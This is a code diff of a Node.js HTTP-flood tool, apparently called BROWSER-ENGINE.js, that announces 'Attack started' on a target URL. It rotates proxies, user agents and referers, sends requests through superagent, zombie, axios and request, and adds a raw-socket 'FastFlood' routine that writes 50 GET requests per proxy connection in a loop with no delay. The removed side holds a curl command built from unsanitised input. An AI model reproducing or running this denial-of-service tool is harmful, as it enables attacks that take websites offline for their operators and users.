@@ -1,102 +1,95 @@
 const url = require("url");
 const chalk = require("chalk");
-const fs = require('fs');
-const { promisify } = require('util');
-const exec = promisify(require('child_process').exec);
 const EventEmitter = require('events');
+const fs = require('fs');
+const Browser = require('zombie');
+const superagent = require('superagent');
+require('superagent-proxy')(superagent)
+const axios = require('axios');
+const request = require('request');
 const emitter = new EventEmitter();
 emitter.setMaxListeners(Number.POSITIVE_INFINITY);
+process.setMaxListeners(0);
+EventEmitter.defaultMaxListeners = Infinity;
+EventEmitter.prototype._maxListeners = Infinity;
 
-if (process.argv.length != 9) {
+process.on('uncaughtException', function (err) { }); 
+process.on('unhandledRejection', function (err) { }); 
+
+if(process.argv.length != 9)
+{
     console.log(chalk.red(`Wrong Usage!`));
-    console.log(chalk.yellow(`Usage: node engine.js [URL] [TIME] [UA-FILE] [THREADS] [METHOD] [PROXY-FILE] [REFERER-FILE]`));
-    process.exit(1);
+    console.log(chalk.yellow(`Usage: node BROWSER-ENGINE.js [URL] [TIME] [UA-FILE] [THREADS] [METHOD] [PROXY-FILE] [REFERER-FILE]`));
+    process.exit(3162);
 }
 
-const target = process.argv[2];
-const time = process.argv[3];
-const useragentFile = process.argv[4];
-const threads = process.argv[5];
-const method = process.argv[6];
-const proxiesFile = process.argv[7];
-const refererFile = process.argv[8];
-const targetHost = url.parse(target).host;
+var target = process.argv[2];
+var time = process.argv[3];
+var useragentFile = process.argv[4];
+var threads = process.argv[5];
+var method = process.argv[6];
+var proxiesFile = process.argv[7];
+var refererFile = process.argv[8];
+var targetPathname = url.parse(target).path;
+var targetHost = url.parse(target).host;
+originTarget = target;
 
-const readFileAsync = promisify(fs.readFile);
+const proxies = fs.readFileSync(proxiesFile, 'utf-8').match(/\S+/g);
+const userAgents = fs.readFileSync(useragentFile, 'utf-8').replace(/\r/g, '').split('\n');
+const referers = fs.readFileSync(refererFile, 'utf-8',).replace(/\r/g, '').split('\n');
 
 console.log(chalk.green(`Attack started on ${target} for ${time} seconds!`));
+var browser = new Browser();
 
-async function BrowserEngine() {
-    try {
-        const [proxy, userAgent, referer] = await Promise.all([
-            getRandomLine(proxiesFile),
-            getRandomLine(useragentFile),
-            getRandomLine(refererFile)
-        ]);
+function BrowserEngine()
+{
+    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
+    var userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+    var referer = referers[Math.floor(Math.random() * referers.length)];
 
-        const targetPathname = target.replace(/%RAND%/g, RandomString(RandomInteger(4, 16)));
-        console.log(chalk.green(`Attacking --> ${targetPathname} | Proxy --> ${proxy}`));
+    target = originTarget.replace(/%RAND%/g, RandomString(RandomInteger(4, 16)));
 
-        switch (method.toUpperCase()) {
-            case 'SUPERAGENT':
-                SuperAgentRequest(targetPathname, proxy, userAgent, referer);
-                break;
-            case 'BROWSER':
-                BrowserRequest(targetPathname, proxy, userAgent, referer);
-                break;
-            case 'AXIOS':
-                AxiosRequest(targetPathname, method, proxy, userAgent, referer);
-                break;
-            default:
-                NormalRequest(targetPathname, method, proxy, userAgent, referer);
-        }
-    } catch (error) {
-        console.error(chalk.red(`Error: ${error.message}`));
-    }
+    console.log(chalk.green(`Attacking --> ${target} Proxy --> [${proxy}]`));
+        
+    FastFlood(target, targetHost, method, proxy, userAgent, referer);
 }
 
-setInterval(BrowserEngine, 1000);
+setInterval(() => {
+    BrowserEngine();
+});
 
 setTimeout(() => process.exit(0), time * 1000);
 
-async function getRandomLine(filename) {
-    const data = await readFileAsync(filename, 'utf-8');
-    const lines = data.trim().split('\n');
-    const randomIndex = Math.floor(Math.random() * lines.length);
-    return lines[randomIndex];
+function SuperAgentRequest(targetString, proxyString, uaString, refererString)
+{
+    superagent
+        .get(targetString)
+        .proxy("http://" + proxyString)
+        .timeout(3600*1000)
+        .set('User-Agent', uaString)
+        .set("Referer", refererString)
+        .set('Cache-Control', 'no-cache')
+        .set('Connection', 'Keep-Alive')
+        .set('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9')
+        .set('Accept-Encoding', 'gzip, deflate, br')
+        .set('Accept-Language', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7')
+        .set('Pragma', 'no-cache')
+        .set('Sec-Fetch-Dest', 'document')
+        .set('Sec-Fetch-Mode', 'navigate')
+        .set('Sec-Fetch-User', '?1')
+        .set('Upgrade-Insecure-Requests', "1")
+        .end((err, res) => {
+        if(err) {
+            //console.error(err);
+            return;
+        }
+    });
 }
 
-async function SuperAgentRequest(targetString, proxyString, uaString, refererString) {
-    const superagent = require('superagent');
-    require('superagent-proxy')(superagent);
+function BrowserRequest(targetString, proxyString, uaString, refererString)
+{
+    browser.proxy = "http://" + proxyString;
 
-    try {
-        await superagent
-            .get(targetString)
-            .proxy(`http://${proxyString}`)
-            .timeout(3600 * 1000)
-            .set('User-Agent', uaString)
-            .set('Referer', refererString)
-            .set('Cache-Control', 'no-cache')
-            .set('Connection', 'Keep-Alive')
-            .set('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9')
-            .set('Accept-Encoding', 'gzip, deflate, br')
-            .set('Accept-Language', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7')
-            .set('Pragma', 'no-cache')
-            .set('Sec-Fetch-Dest', 'document')
-            .set('Sec-Fetch-Mode', 'navigate')
-            .set('Sec-Fetch-User', '?1')
-            .set('Upgrade-Insecure-Requests', '1');
-    } catch (error) {
-        // Ignore errors
-    }
-}
-
-async function BrowserRequest(targetString, proxyString, uaString, refererString) {
-    const { Browser } = require('zombie');
-    const browser = new Browser();
-
-    browser.proxy = `http://${proxyString}`;
     browser.headers = {
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
         "Accept-Encoding": "gzip, deflate, br",
@@ -111,30 +104,31 @@ async function BrowserRequest(targetString, proxyString, uaString, refererString
         "Referer": refererString,
         "User-Agent": uaString
     };
-
+    
     browser.maxDuration = 400e3;
     browser.maxWait = 380e3;
     browser.waitDuration = '1000s';
-
-    try {
-        await browser.visit(targetString);
-        await browser.wait(370e3);
-        await browser.reload();
-        await browser.wait(50e3);
-        await browser.deleteCookies();
-        await browser.window.close();
-        await browser.destroy();
-    } catch (error) {
-        // Ignore errors
-    }
+    browser.visit(targetString, () => {
+        browser.wait(370e3, () => {
+            browser.reload();
+            browser.wait(50e3, async () => {
+                await browser.deleteCookies();
+                await browser.window.close();
+                await browser.destroy();
+                browser = undefined;
+                delete browser;
+                return false;
+            });
+        });
+    });
 }
 
-async function AxiosRequest(targetString, methodString, proxyString, uaString, refererString) {
-    const axios = require('axios');
+function AxiosRequest(targetString, methodString, proxyString, uaString, refererString)
+{
     const config = {
         method: methodString,
         url: targetString,
-        headers: {
+        headers: { 
             'User-Agent': uaString,
             'Referer': refererString,
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -145,28 +139,23 @@ async function AxiosRequest(targetString, methodString, proxyString, uaString, r
             'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
             'Sec-Fetch-User': '?1',
-            'Upgrade-Insecure-Requests': '1',
+            'Upgrade-Insecure-Requests': "1",
             'Connection': 'Keep-Alive'
         },
         proxy: {
             host: proxyString.split(":")[0],
             port: proxyString.split(":")[1]
         }
-    };
-
-    try {
-        await axios(config);
-    } catch (error) {
-        // Ignore errors
     }
+    axios(config);
 }
 
-async function NormalRequest(targetString, methodString, proxyString, uaString, refererString) {
-    const request = require('request');
-    const options = {
+function NormalRequest(targetString, methodString, proxyString, uaString, refererString)
+{
+    request({ 
         url: targetString,
         method: methodString,
-        proxy: `http://${proxyString}`,
+        proxy: 'http://' + proxyString,
         headers: {
             'User-Agent': uaString,
             'Referer': refererString,
@@ -178,28 +167,35 @@ async function NormalRequest(targetString, methodString, proxyString, uaString, 
             'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
             'Sec-Fetch-User': '?1',
-            'Upgrade-Insecure-Requests': '1',
+            'Upgrade-Insecure-Requests': "1",
             'Connection': 'Keep-Alive'
         }
-    };
-
-    try {
-        await exec('curl -X ' + methodString + ' -H "User-Agent: ' + uaString + '" -H "Referer: ' + refererString + '" ' + targetString + ' --proxy ' + proxyString);
-    } catch (error) {
-        // Ignore errors
-    }
+    });
 }
 
-function RandomInteger(min, max) {
-    return Math.floor(Math.random() * (max - min) + min);
+function FastFlood(targetString, targetHostString, methodString, proxyString, uaString, refererString)
+{
+    var Socket = require('net').Socket();
+    Socket.connect(proxyString.split(":")[1], proxyString.split(":")[0]);
+    //Socket.setTimeout(10000);
+    for (var i = 0; i < 50; i++) {
+        Socket.write(`GET ${targetString} HTTP/1.1\r\nHost: ${targetHostString}\r\nReferer: ${refererString}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\r\nPragma: no-cache\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: no-cache\r\nUser-Agent: ${uaString}\r\nConnection: Keep-Alive\r\n\r\n`);
+    }
+    Socket.on('data', function () { setTimeout(function () { Socket.destroy(); return delete Socket; }, 5000); })
+}
+
+function RandomInteger(min, max) {  
+  return Math.floor(
+    Math.random() * (max - min) + min
+  )
 }
 
 function RandomString(length) {
-    var result = '';
-    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    var charactersLength = characters.length;
-    for (var i = 0; i < length; i++) {
-        result += characters.charAt(Math.floor(Math.random() * charactersLength));
-    }
-    return result;
-}
+  var result           = '';
+  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  var charactersLength = characters.length;
+  for ( var i = 0; i < length; i++ ) {
+     result += characters.charAt(Math.floor(Math.random() * charactersLength));
+  }
+  return result;
+        }
